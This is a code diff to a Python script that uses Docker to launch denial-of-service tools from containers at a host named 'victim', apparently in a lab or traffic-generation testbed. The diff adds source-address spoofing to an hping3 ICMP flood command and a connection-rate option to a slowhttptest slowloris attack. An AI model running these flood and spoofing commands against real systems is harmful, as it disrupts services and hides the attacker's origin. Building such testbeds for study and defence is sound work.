@@ -9,16 +9,20 @@ def ping(container_id):
     print(result.output.decode())
 
 
-def icmp_flood(container_id):
+def icmp_flood(container_id, ip_address):
     container = client.containers.get(container_id)
-    result = container.exec_run("hping3 --icmp --flood victim")
+    if ip_address:
+        result = container.exec_run(f"hping3 -p 80 --icmp --flood -a {ip_address} victim")
+    else:
+        result = container.exec_run("hping3 -p 80 --icmp --flood victim")
+    # result = container.exec_run(f"hping3 {ip_address} -p 80 --icmp --flood victim")
     print(result.output.decode())
 
 
-def slowloris(container_id, number_of_connections):
+def slowloris(container_id, number_of_connections, connection_rate):
     container = client.containers.get(container_id)
     result = container.exec_run(
-        f"slowhttptest -c {number_of_connections} -g -u http://victim"
+        f"slowhttptest -c {number_of_connections} -r {connection_rate} -g -u http://victim"
     )
     print(result.output.decode())
 
